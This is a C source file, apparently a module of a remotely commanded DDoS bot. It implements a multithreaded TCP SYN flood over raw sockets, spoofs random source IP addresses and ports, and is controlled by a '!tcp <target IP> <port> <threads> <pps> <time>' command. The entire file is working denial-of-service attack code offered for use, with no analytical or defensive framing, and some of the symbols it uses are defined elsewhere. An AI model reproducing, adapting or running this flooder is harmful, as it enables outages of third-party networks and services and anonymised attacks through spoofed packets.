/*
 * This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)
 */
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9


static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

void init_rand_tcp(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc_tcp(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum_tcp (unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum_tcp(tcp,totaltcp_len);
	free(tcp);
	return output;
}

void setup_ip_header_TCP(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
}

void setup_tcp_header_tcp(struct tcphdr *tcph)
{
	tcph->source = htons(5678);
	tcph->seq = rand();
	tcph->ack_seq = 0;
	tcph->res2 = 0;
	tcph->doff = 5;
	tcph->syn = 1;
	tcph->window = htonl(65535);
	tcph->check = 0;
	tcph->urg_ptr = 0;
}

void *floodtcp(void *par1)
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header_TCP(iph);
	setup_tcp_header_tcp(tcph);

	tcph->dest = htons(floodport);

	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum_tcp ((unsigned short *) datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	init_rand_tcp(time(NULL));
	register unsigned int i;
	i = 0;
	while(1){
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));

		iph->saddr = (rand_cmwc_tcp() >> 24 & 0xFF) << 24 | (rand_cmwc_tcp() >> 16 & 0xFF) << 16 | (rand_cmwc_tcp() >> 8 & 0xFF) << 8 | (rand_cmwc_tcp() & 0xFF);
		iph->id = htonl(rand_cmwc_tcp() & 0xFFFFFFFF);
		iph->check = csum_tcp ((unsigned short *) datagram, iph->tot_len);
		tcph->seq = rand_cmwc_tcp() & 0xFFFF;
		tcph->source = htons(rand_cmwc_tcp() & 0xFFFF);
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);

		pps++;
		if(i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}
int tcp(char *s)
{
	signal(SIGALRM,(void (*)(int))kill_child);
	child_pid = fork();
	if (child_pid > 0) {
		wait(NULL);

	}
	else if (child_pid == 0){
		time_t my_time;
		time(&my_time);
		struct tm * time_real; 
		time_real = localtime (&my_time);

		struct timespec start, end;
		double start_sec, end_sec, elapsed_sec;
		clock_gettime(CLOCK_REALTIME, &start);
		//if(s < 6){
		//	Send("Invalid parameters!\n");
		//	AdmSend("Usage: !tcp <target IP> <port to be flooded> <number threads to use> <pps limiter, -1 for no limit> <time>\n");
		//	exit(-1);
		//}

		char i1[128]= "", i2[128]= "", i3[128]= "", i4[128]= "", i5[128]= "";
		char *text = s;
		sscanf(text, "%s %s %s %s %s", &i1, &i2, &i3, &i4, &i5);


		time(&my_time);
		time_real = localtime(&my_time);
		AdmSend("%s\nTCP Flooder\n",asctime(time_real));
		//	Send("%s %s %s %s %s",i1, i2, i3, i4, i5);

		AdmSend("Setting up Sockets...\n");

		int num_threads = atoi(i3);
		floodport = atoi(i2);
		int maxpps = atoi(i4);
		limiter = 0;
		pps = 0;
		pthread_t thread[num_threads];

		int multiplier = 20;

		int i;
		for(i = 0;i<num_threads;i++){
			pthread_create( &thread[i], NULL, &floodtcp, (void *)i1);
		}
		AdmSend("Starting Flood > %s ...",i1);
		for(i = 0;i<(atoi(i5)*multiplier);i++)
		{
			usleep((1000/multiplier)*1000);
			if((pps*multiplier) > maxpps)
			{
				if(1 > limiter)
				{
					sleeptime+=100;
				} else {
					limiter--;
				}
			} else {
				limiter++;
				if(sleeptime > 25)
				{
					sleeptime-=25;
				} else {
					sleeptime = 0;
				}
			}
			pps = 0;
		}
		Send("%s\n[TCP DONE]\n",asctime(time_real));
		clock_gettime(CLOCK_REALTIME, &end);
		start_sec = start.tv_sec + start.tv_nsec/NANO_PER_SEC;
		end_sec = end.tv_sec + end.tv_nsec/NANO_PER_SEC;
		elapsed_sec = end_sec - start_sec;
		AdmSend("The operation took %.3f seconds\n", elapsed_sec);
		exit(0);
	}
}
